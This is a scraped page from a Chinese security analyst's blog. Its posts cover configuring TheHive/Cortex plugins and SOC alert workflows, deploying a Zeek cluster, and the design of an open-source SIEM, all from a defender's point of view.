<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;threat&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;ioc&quot;</span>: <span class="string">&quot;193.142.146.143&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;ip&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;tags&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;burp scan&quot;</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;该IP在短时间内对用户登录接口发起大量访问，且包含着大量登录失败的情况&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;created_by&quot;</span>: <span class="string">&quot;canon@loveyou.com&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;producer&quot;</span>: <span class="string">&quot;Canon&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;provider&quot;</span>: <span class="string">&quot;TheHive&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;creation_time&quot;</span>: <span class="string">&quot;2021-05-14T09:48:23.664Z&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;modification_time&quot;</span>: <span class="string">&quot;2021-05-14T09:48:23.664Z&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;expiration_time&quot;</span>: <span class="string">&quot;2021-05-29T09:48:23.664Z&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;meta&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;case&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">&quot;title&quot;</span>: <span class="string">&quot;安全分析 - 周报（05.10-05.14）&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;created_by&quot;</span>: <span class="string">&quot;canon@loveyou.com&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;owner&quot;</span>: <span class="string">&quot;canon@loveyou.com&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;link&quot;</span>: <span class="string">&quot;https://127.0.0.1:9000/index.html#!/case/~43769904/observables/~463080&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;timestamp&quot;</span>: <span class="string">&quot;2021-05-14T09:48:23.664Z&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="如何启用插件"><a href="#如何启用插件" class="headerlink" title="如何启用插件"></a>如何启用插件</h2><h3 id="加载插件"><a href="#加载插件" class="headerlink" title="加载插件"></a>加载插件</h3><ul>
<li>插件路径<ul>
<li> <code>/etc/cortex/Cortex-Analyzers/analyzers</code></li>
<li><code>/etc/cortex/Cortex-Analyzers/responders</code></li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ll /etc/cortex/Cortex-Analyzers/analyzers</span><br><span class="line">drwxr-xr-x 10 root root 4096 May  5 01:48 ./</span><br><span class="line">drwxr-xr-x 10 root root 4096 May  5 01:49 ../</span><br><span class="line">drwxr-xr-x  2 root root 4096 May  5 01:48 ProxyCheck/</span><br><span class="line">drwxr-xr-x  2 root root 4096 May  5 01:48 ThreatBook/</span><br><span class="line"></span><br><span class="line">$ ll /etc/cortex/Cortex-Analyzers/responders</span><br><span class="line">drwxr-xr-x  6 root root 4096 May  5 01:49 ./</span><br><span class="line">drwxr-xr-x 10 root root 4096 May  5 01:49 ../</span><br><span class="line">drwxr-xr-x  2 root root 4096 May  5 01:49 Mail/</span><br></pre></td></tr></table></figure>

<ul>
<li><p>修改配置文件<code>/etc/cortex/application.conf</code></p>
<p>建议大家将新增的插件与官方的插件区别开，这样后期也便于维护。</p>
</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## ANALYZERS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">analyzer</span> &#123;</span><br><span class="line">  <span class="string">urls</span> <span class="string">=</span> [</span><br><span class="line">    <span class="string">&quot;https://download.thehive-project.org/analyzers.json&quot;</span></span><br><span class="line">    <span class="string">&quot;/etc/cortex/Cortex-Analyzers/analyzers&quot;</span>	<span class="comment"># 新增自定义插件</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># RESPONDERS</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">responder</span> &#123;</span><br><span class="line">  <span class="string">urls</span> <span class="string">=</span> [</span><br><span class="line">    <span class="string">&quot;https://download.thehive-project.org/responders.json&quot;</span></span><br><span class="line">    <span class="string">&quot;/etc/cortex/Cortex-Analyzers/responders&quot;</span>	<span class="comment"># 新增自定义插件</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="启用插件"><a href="#启用插件" class="headerlink" title="启用插件"></a>启用插件</h3><ul>
<li><p><em>Analyzers</em></p>
<ul>
<li><em>ThreatBook - Analyzers Config</em></li>
</ul>
<p>![Analyzers Config](/Analyzers Config.png)</p>
<ul>
<li><em>ThreatBook - Analyzers</em></li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/Analyzers.png" alt="Analyzers"></p>
</li>
<li><p><em>Responders</em></p>
<ul>
<li><em>Mail - Responders Config</em></li>
</ul>
<p>![Responders Config](/Responders Config.png)</p>
<ul>
<li><em>Mail - Responders</em></li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/Responders.png" alt="Responders"></p>
</li>
</ul>
<h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>​    下面来说一下我们都用<em>TheHive</em>做了哪些，刚开始使用场景其实并不多，还需要后期的摸索。</p>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/workflow.png" alt="workflow"></p>
<p>提前创建好模板，例如：按照Playbook的形式提前创建好。便于后期快速引用</p>
<ul>
<li><p>分析周报模板</p>
<p>按照周为单位创建Case，以天为单位创建Task。</p>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%91%A8%E6%8A%A5%E6%A8%A1%E6%9D%BF.png" alt="周报模板"></p>
</li>
<li><p>应急响应模板</p>
<p>可以参照应急响应阶段来创建</p>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A8%A1%E6%9D%BF.png" alt="应急响应"></p>
</li>
<li><p>引用模板</p>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%BC%95%E7%94%A8%E6%A8%A1%E6%9D%BF.png" alt="引用模板"></p>
</li>
<li><p>事件运营：<em>SIEM</em>（<em>Alarm</em>） -&gt; <em>TheHive</em>（<em>Alert</em>）</p>
<p><em>TheHive</em>与<em>SIEM</em>做了对接，主要将两种类型的告警自动化的推送到了<em>TheHive</em>上。</p>
<ul>
<li><p>第一种：需要研判的安全事件。例如：基于内-&gt;外的<em>NetFlow</em>告警事件（异常端口访问，周期性请求等等）、敏感信息泄漏告警事件（黑客论坛监控、<em>GitHub</em>监控）。通常这类事件需要进行二次确认的，所以会选择通过<em>TheHive</em>来记录整个事件的处理过程。</p>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E4%BA%BA%E5%B7%A5%E7%A0%94%E5%88%A4%E4%BA%8B%E4%BB%B6-1.png" alt="人工研判事件-1"></p>
</li>
<li><p>第二种：需要重点关注的安全事件。例如：<em>EDR</em>上的告警事件，命中C2指标的情报告警，通常这类事件需要第一时间去响应。</p>
<ul>
<li>在事件响应的过程中我们可以借助<em>Cortex Analyzers</em>的能力协助我们进行数据分析。如：同时调用多家情报厂商接口进行查询，丰富化数据信息（查询<em>PDNS</em>信息、<em>Whois</em>信息、CMDB等），联动<em>SIEM</em>查询近一段时间内的安全事件等。</li>
<li>对于已“实锤”的<em>指标</em>，可通过<em>Cortex Responders</em>组件与安全设备进行联动，批量下发阻断策略，及时止损。</li>
<li>对于跨部门协作的问题，可利用<em>TheHive</em>去同步事件响应的进度，包括在同一个Case里讨论该问题。</li>
<li>通过对响应过程的记录，可更好的帮助我们去优化安全事件响应流程，并同时帮助我们积累<em>Playbook</em>，为日后的自动化做铺垫。</li>
</ul>
</li>
</ul>
</li>
<li><p>规则运营：<em>SIEM</em>（<em>Alarm</em>、<em>Alert</em>）-&gt; <em>TheHive</em>（<em>Case</em>）</p>
<p>​        主要是将分析时发现的规则误报以及漏报的情况，通过手动提交<em>Case</em>的形式发送到<em>TheHive</em>上。例如，在<em>SIEM</em>上发现了某个告警存在误报的现象，通过<em>SIEM</em>提交该告警信息给指定负责人，系统会自动将邮件以及<em>Case</em>转到该人员名下。</p>
<ul>
<li>通过<em>SIEM</em>推送至<em>TheHive</em>，并通知分析人员进行规则优化。</li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E8%A7%84%E5%88%99%E8%BF%90%E8%90%A5-4.png" alt="规则运营-4"></p>
<ul>
<li>提交Case并邮件通知</li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E8%A7%84%E5%88%99%E8%BF%90%E8%90%A5-5.png" alt="规则运营-5"></p>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E8%A7%84%E5%88%99%E8%BF%90%E8%90%A5-6.png" alt="规则运营-6"></p>
<ul>
<li>TheHive</li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E8%A7%84%E5%88%99%E8%BF%90%E8%90%A5-7.png" alt="规则运营-7"></p>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E8%A7%84%E5%88%99%E8%BF%90%E8%90%A5-8.png" alt="规则运营-8"></p>
</li>
<li><p>日常事项：</p>
<ul>
<li><p>安全分析周报</p>
<ul>
<li>以周为单位创建<em>Case</em></li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E5%91%A8%E6%8A%A501.png" alt="安全分析周报01"></p>
<ul>
<li>以天为单位创建<em>Task</em></li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E5%91%A8%E6%8A%A503.png" alt="安全分析周报03"></p>
<ul>
<li>告警与<em>Case</em>相关联</li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E5%91%A8%E6%8A%A505.png" alt="安全分析周报05"></p>
<ul>
<li>批量分析<em>IoC</em></li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E5%91%A8%E6%8A%A502.png" alt="安全分析周报02"></p>
<ul>
<li>分享给需要关注的小组</li>
</ul>
<p><img src="/2021/05/03/%E7%8E%A9%E8%BD%ACTheHive%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0/%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E5%91%A8%E6%8A%A504.png" alt="安全分析周报04"></p>
</li>
</ul>
</li>
</ul>
<hr>
<p><strong>写在最后：</strong>        </p>
<p>​    如果你有关注过开源解决方案的话，相信你一定有看到过一些<em>TheHive</em>与工作流（**<a target="_blank" rel="noopener" href="https://medium.com/shuffle-automation">Shuffle</a>、<a target="_blank" rel="noopener" href="https://docs.n8n.io/nodes/n8n-nodes-base.theHive/#basic-operations">n8n</a><strong>）组件整合的方案。不难看出，<em>TheHive</em>擅长的是事件响应与分析，这是一种半自动化的形式。通过与工作流组件的对接，你会发现这就是一个“</strong>散装*<em>”版的</em>SOAR<em>。商业的</em>SOAR<em>相比开源的</em>SOAR<em>多了一个“作战室”的概念，这个功能与</em>TheHive<em>就会有那么一些相似。例如：你可以在作战室中分析某个IP的情报信息，或者联动现有安全设备对某个</em>IoC<em>进行响应的操作。这些功能其实就是对应到了</em>TheHive<em>中的</em>Analyzers<em>与</em>Responders*的功能。</p>
<p>​    我个人觉得<em>TheHive</em>这种“半自动化”的形式，可以很好的与<em>SOAR</em>进行互补，相信与<em>SOAR</em>对接后会有更多的“价值”被体现出来。例如：在分析任务中可按照场景的不同有选择的调用<em>SOAR</em>的<em>PalyBook</em>，并将响应结果<em>feedback</em>至<em>TheHive</em>中。其实<em>TheHive</em>上还有挺多东西值得说的，一次也写不完。更多东西还需要我们根据实际场景再去挖掘，“思路”很重要！</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/02/Zeek-%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E6%A8%A1%E5%BC%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Canon">
      <meta itemprop="description" content="一个热爱健身的安全分析师">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Canon's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/03/02/Zeek-%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E6%A8%A1%E5%BC%8F/" class="post-title-link" itemprop="url">Zeek - 集群部署模式</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-03-02 10:40:04" itemprop="dateCreated datePublished" datetime="2021-03-02T10:40:04+08:00">2021-03-02</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2021-03-05 14:38:44" itemprop="dateModified" datetime="2021-03-05T14:38:44+08:00">2021-03-05</time>
      </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>1.3k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>1 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p><strong><a target="_blank" rel="noopener" href="https://software.opensuse.org/download.html?project=security:zeek&package=zeek">在线安装</a></strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;deb http://download.opensuse.org/repositories/security:/zeek/Debian_10/ /&#x27;</span> | sudo tee /etc/apt/sources.list.d/security:zeek.list</span><br><span class="line">$ curl -fsSL https://download.opensuse.org/repositories/security:zeek/Debian_10/Release.key | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/security_zeek.gpg &gt; /dev/null</span><br><span class="line">$ sudo apt update</span><br><span class="line">$ sudo apt install zeek</span><br></pre></td></tr></table></figure>





<h4 id="架构图"><a href="#架构图" class="headerlink" title="架构图"></a>架构图</h4><p><img src="https://docs.zeek.org/en/master/_images/deployment.png" alt="_images / deployment.png"></p>
<p><strong>Manager -&gt; Worker</strong></p>
<ol>
<li>在设置集群时，必须在所有主机上设置Zeek用户，并且该用户必须能够从管理器中对集群中的所有机器进行ssh访问，并且必须在不被提示密码/口令的情况下工作（例如，使用ssh公钥认证）。另外，在工作节点上，该用户必须能够以混杂模式访问目标网络接口。</li>
<li>存储必须在同一路径下的所有主机上可用。</li>
</ol>
<h5 id="Manager"><a href="#Manager" class="headerlink" title="Manager"></a>Manager</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装Zeek 略过</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成SSH Key</span></span><br><span class="line">$ ssh-keygen</span><br><span class="line"></span><br><span class="line"><span class="comment"># 记得Worker节点需要创建.ssh目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制ssh pub到Zeek Worker</span></span><br><span class="line">$ scp /root/.ssh/id_rsa.pub root@Zeek-Worker1:~/.ssh/authorized_keys2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置Manager node.cfg</span></span><br><span class="line">$ vim /opt/zeek/etc/node.cfg</span><br><span class="line">[logger-1]</span><br><span class="line"><span class="built_in">type</span>=logger</span><br><span class="line">host=Zeek-Manager</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">[manager]</span><br><span class="line"><span class="built_in">type</span>=manager</span><br><span class="line">host=Zeek-Manager</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">[proxy-1]</span><br><span class="line"><span class="built_in">type</span>=proxy</span><br><span class="line">host=Zeek-Manager</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">[worker-1]</span><br><span class="line"><span class="built_in">type</span>=worker</span><br><span class="line">host=Zeek-Worker1</span><br><span class="line">interface=ens224</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">[worker-2]</span><br><span class="line"><span class="built_in">type</span>=worker</span><br><span class="line">host=Zeek-Worker2</span><br><span class="line">interface=ens224</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查Zeek</span></span><br><span class="line">$ zeekctl</span><br><span class="line">[ZeekControl] &gt; check</span><br><span class="line">logger-1 scripts are ok.</span><br><span class="line">manager scripts are ok.</span><br><span class="line">proxy-1 scripts are ok.</span><br><span class="line">worker-1 scripts are ok.</span><br><span class="line">worker-2 scripts are ok.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Zeek</span></span><br><span class="line">$ zeekctl</span><br><span class="line">[ZeekControl] &gt; start</span><br><span class="line">starting logger ...</span><br><span class="line">starting manager ...</span><br><span class="line">starting proxy ...</span><br><span class="line">starting workers ...</span><br></pre></td></tr></table></figure>



<h4 id="集群中性能是否对于单台有优化待测试"><a href="#集群中性能是否对于单台有优化待测试" class="headerlink" title="集群中性能是否对于单台有优化待测试"></a>集群中性能是否对于单台有优化待测试</h4>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Canon">
      <meta itemprop="description" content="一个热爱健身的安全分析师">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Canon's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">致我心中的 “散装”（开源）SIEM（一）</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-02-02 16:55:52" itemprop="dateCreated datePublished" datetime="2021-02-02T16:55:52+08:00">2021-02-02</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2023-10-24 10:15:49" itemprop="dateModified" datetime="2023-10-24T10:15:49+08:00">2023-10-24</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/SIEM/" itemprop="url" rel="index"><span itemprop="name">SIEM</span></a>
        </span>
    </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>33k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>30 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>​        由于工作比较忙，有段时间没有更了，快到年底了，就当是总结了。今年主要精力都是在围绕着安全运营这一块的工作，随着工作的开展发现自己<strong>“组装”</strong>的SIEM用起来不是很“<strong>舒服</strong>”。这是我之前写的一篇《<a target="_blank" rel="noopener" href="https://canon88.github.io/2020/02/25/Wazuh-%E5%A6%82%E4%BD%95%E5%AF%B9%E5%BC%82%E6%9E%84%E6%95%B0%E6%8D%AE%E8%BF%9B%E8%A1%8C%E5%85%B3%E8%81%94%E5%91%8A%E8%AD%A6/"><strong>Wazuh-如何对异构数据进行关联告警</strong></a>》的文章，当时规划的数据流的Workflow如下图所示。</p>
<p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/image-20200303215020561.png" alt="image-20200303215020561"></p>
<p>​        <strong>“散装”SIEM</strong>主要是建立在ELK的框架之上，告警模块分别采用了Wazuh与Elastalert。早期为了使Wazuh能够消费异构数据<strong>（WAF、NTA、EDR）</strong>并进行关联告警，我在数据入库之前利用Logstash对异构数据进行了标准化，同时Wazuh对标准化后的数据进行关联。例如：Suricata通过Filebeat将告警事件发出，由Logstash统一进行标准化处理并同时输出到Elastic以及Wazuh。其中Elastic为告警的元数据，推送到Wazuh上的为标准化后的安全事件。</p>
<hr>
<h1 id="“散装”SIEM-v0-1的不足与改进措施"><a href="#“散装”SIEM-v0-1的不足与改进措施" class="headerlink" title="“散装”SIEM v0.1的不足与改进措施"></a>“散装”SIEM v0.1的不足与改进措施</h1><h2 id="1-数据标准化"><a href="#1-数据标准化" class="headerlink" title="1. 数据标准化"></a>1. 数据标准化</h2><p>​        由于前期的标准化未采用**<a target="_blank" rel="noopener" href="https://www.elastic.co/guide/en/ecs/current/ecs-reference.html">ECS</a>**(<strong>Elastic Common Schema</strong>)，导致后期沿用Elastic生态的时候出现了使用上的不便。大家都知道ES在7.X的版本推出了SIEM这个功能，如果想使用Elastic SIEM进行分析的话，那么ECS是首选。这里为了后期与开源生态更好的进行融合，需要将原先的标准化转为ECS的格式。</p>
<h2 id="2-告警丰富化"><a href="#2-告警丰富化" class="headerlink" title="2. 告警丰富化"></a>2. 告警丰富化</h2><p>为了更有效的提升告警质量，提高安全分析的效率。需要对入库的安全事件以及产生的告警进行必要的丰富化。</p>
<ul>
<li><p>利用CMDB平台的数据对内部资产进行丰富化。例如增加：部门、业务、应用类型、负责人等字段。</p>
</li>
<li><p>对接威胁情报数据，SIEM会对告警事件的攻击IP进行情报侧数据的丰富化；</p>
<ul>
<li>本地威胁情报（曾经攻击过我们的IP地址）</li>
<li>第三方威胁情报<ul>
<li>开源</li>
<li>商业</li>
</ul>
</li>
</ul>
</li>
<li><p>敏感接口监控（如：登录接口、支付接口、钱包接口）。利用第三方数据对IP地址进行Proxy标记，为后期风控的研判提供一些数据支撑；</p>
</li>
<li><p>为安全事件增加方向与区域的字段。便于分析人员第一时间识别<strong>内对内</strong>以及<strong>内对外</strong>的告警。也可针对方向进行告警级别的权重调整；</p>
</li>
</ul>
<h2 id="3-提升检测能力"><a href="#3-提升检测能力" class="headerlink" title="3. 提升检测能力"></a>3. 提升检测能力</h2><p>底层安全设备的检测能力与安全事件的可信度，是直接影响SIEM告警的关键因素。</p>
<ul>
<li>接入Imperva WAF的告警数据，与Suricata进行自动化关联，定期将绕过的规则“移植”到前端的Imperva WAF上，加强边界的安全防护能力；</li>
<li>“消费”AWS VPC FLOW数据，增加<strong>内对外</strong>的异常连接检测能力。由于是四层数据能够被<strong>“消费”</strong>的维度实在不多。主要实现了以下几种告警：<ul>
<li>周期性连接告警</li>
<li>威胁情报类告警</li>
<li>端口扫描类告警<ul>
<li>短时间内，内网主机请求相同目的IP的多个端口</li>
<li>短时间内，内网主机请求多个IP的相同目的端口</li>
</ul>
</li>
<li>敏感端口请求告警</li>
</ul>
</li>
</ul>
